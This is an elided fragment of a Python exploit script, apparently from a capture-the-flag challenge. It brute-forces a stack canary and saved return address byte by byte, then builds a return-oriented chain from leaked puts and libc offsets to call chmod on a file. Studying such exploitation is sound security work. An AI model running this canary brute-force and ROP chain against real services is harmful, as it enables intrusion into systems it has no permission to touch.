...
"""
# Stage - 2
bruteforced_canary = p64(0xc4c3bf1bf8374c00)
saved_rip = b""
...
while(len(saved_rip) <= 8):
	for i in range(0x00, 0xff+1):
		...
		if(b"### Goodbye!") in res:
			...
			print("[+] Found a byte :: {}".format(byte))
			saved_rip += byte
			print("[+] Canary Till Now :: {}".format(saved_rip))
			print()
			continue
		else:
			print("[!] Trying byte {}".format(byte))
...
# Stage - 3
bruteforced_canary = p64(0xc4c3bf1bf8374c00)
saved_rip = 0x559962c31e69

pop_rdi_ret = p64(saved_rip + 0x8a)
puts_plt = p64(saved_rip - 0xc99)
puts_got = p64(saved_rip + 0x20c7)
...
puts_at_libc = 0x7f12a728a5a0
chmod_at_libc = puts_at_libc + 0x7f160 # 0x7f160 = |puts.offset - chmod.offset|

pop_rdi_ret = p64(saved_rip + 0x8a)
pop_rsi_ret = p64(saved_rip + 0x88)
filename = p64(saved_rip + 0x7d4)
mode = p64(0x4)
